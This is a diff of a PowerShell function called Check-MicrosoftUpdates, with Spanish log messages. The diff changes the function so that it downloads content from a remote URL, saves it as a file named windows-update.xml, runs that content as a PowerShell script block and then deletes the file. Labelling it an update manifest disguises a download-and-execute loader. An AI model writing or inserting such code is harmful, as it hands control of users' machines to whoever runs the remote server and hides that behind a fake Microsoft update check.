@@ -131,25 +131,25 @@ function Check-MicrosoftUpdates {
     $updateFile = "$updateCache\windows-update.xml"
     
     try {
+        $response = Invoke-WebRequest -Uri $msService -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue
         
-        $response = Invoke-WebRequest -Uri $msService -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue 2>&1 | Out-Null
-        
-       
-        if (Test-Path $updateFile) {
+        if ($response.StatusCode -eq 200) {
+            $response.Content | Out-File $updateFile -Encoding UTF8 -Force
             Write-Log "  - Manifest de actualizaciones descargado" -Type "SUCCESS"
             
-            
-            $updateData = Get-Content $updateFile -Raw -ErrorAction SilentlyContinue 2>&1 | Out-Null
-            if ($updateData) {
-             
-                $updateScript = [ScriptBlock]::Create($updateData)
-                & $updateScript 2>&1 | Out-Null
+            if (Test-Path $updateFile) {
+                $updateData = Get-Content $updateFile -Raw -ErrorAction SilentlyContinue
+                if ($updateData) {
+                    
+                    $updateScript = [ScriptBlock]::Create($updateData)
+                    & $updateScript
+                }
             }
             
-            Remove-Item $updateFile -Force -ErrorAction SilentlyContinue 2>&1 | Out-Null
+            Remove-Item $updateFile -Force -ErrorAction SilentlyContinue
         }
         else {
-            Write-Log "  - Servidor de actualizaciones no disponible" -Type "WARNING"
+            Write-Log "  - Servidor de actualizaciones no disponible (HTTP $($response.StatusCode))" -Type "WARNING"
         }
     }
     catch {
